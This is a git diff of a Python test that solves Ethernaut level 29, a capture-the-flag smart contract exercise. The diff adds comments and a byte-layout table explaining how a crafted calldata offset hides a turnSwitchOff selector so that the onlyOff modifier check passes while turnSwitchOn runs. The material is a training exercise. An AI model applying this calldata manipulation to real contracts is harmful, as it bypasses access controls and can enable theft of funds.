@@ -11,27 +11,32 @@ def test_lv29():
     ethernaut.check_lv29(contract)
 
 def exploit_lv29(contract: Switch):
-    # when passing dynamic types to calldata,
-    # we have to pass the memory location of the data
-    # and the length of the data
+    # Attack vector: data offset can be specified freerly - multiple function selectors can be passed
+    # Training: know how calldata for dynamic sized arguments are encoded
 
-    # it is important to note that the pointer to the data 
-    # first points to the length of the data
-    # and after that comes the data itself
+    # When passing dynamic types to calldata, we have to pass:
+    #  1) the memory location (offset) of the data
+    #  2) the length of the data
+    #  3) the data itself
 
-    # we will utilise this to modify the calldata structure in the following way:
-    # first we add the function selector,
-    # then the memory location of the data
-    # then the encoded turnSwitchOff string to bypass the onlyOff modifier
-    # and only then the function arguments (the data) itself will follow
+    # We will utilise this to modify the calldata structure in the following way:
+    #  1) first we add the function selector of function we are calling
+    #  2) then the memory location (offset) of the data
+    #  3) then the turnSwitchOff() selector to bypass the onlyOff modifier
+    #  4) the length of the data
+    #  5) data itself - the function selector of function, which will be called - turnSwitchOn() 
 
-    # the calldata will have the following layout:
-    # 0-3: function selector
-    # 4-35: memory location of the input 
-    # 36-67: empty zeros (so that the data starts at the 68th byte)
-    # 68-99:  encoded turnSwitchOff string to bypass the onlyOff modifier
-    # 100-131: input data length
-    # 132-163: input data
+    # The calldata will have the following layout:
+    # ┌─────────────┬──────┬────────────────────────────────────────────────────────────┬────────────────────────────────┐
+    # │ Bytes index │ Size │ Description                                                │ Short desctiption              │
+    # ├─────────────┼──────┼────────────────────────────────────────────────────────────┼────────────────────────────────┤
+    # │   0-3       │  4B  │ flipSwitch() selector - function we are calling first      │ = function which gets the data │
+    # │   4-35      │ 32B  │ memory offset of the dynamic input - 60 (hex) = 96 (int)   │ = offset       \               │
+    # │   36-67     │ 32B  │ empty zeros (so that the selector starts at the 68th byte) │ (skipped)       > 96 bytes     │
+    # │   68-99     │ 32B  │ turnSwitchOff() selector to bypass the onlyOff modifier    │ (skipped)      /               │ 
+    # │   100-131   │ 32B  │ input data length = 4 (bytes)                              │ = length                       │
+    # │   132-163   │ 32B  │ turnSwitchOn() selector - function which gets called       │ = data                         │
+    # └─────────────┴──────┴────────────────────────────────────────────────────────────┴────────────────────────────────┘
 
     calldata = Switch.flipSwitch.selector.hex() +\
         "0"*62 + "60" +\
@@ -40,6 +45,4 @@ def exploit_lv29(contract: Switch):
         "0"*63 + "4" +\
         Switch.turnSwitchOn.selector.hex() + "0"*56
 
-    calldata = bytes.fromhex(calldata)
-
-    contract.transact(data=calldata)
+    contract.transact(bytes.fromhex(calldata))
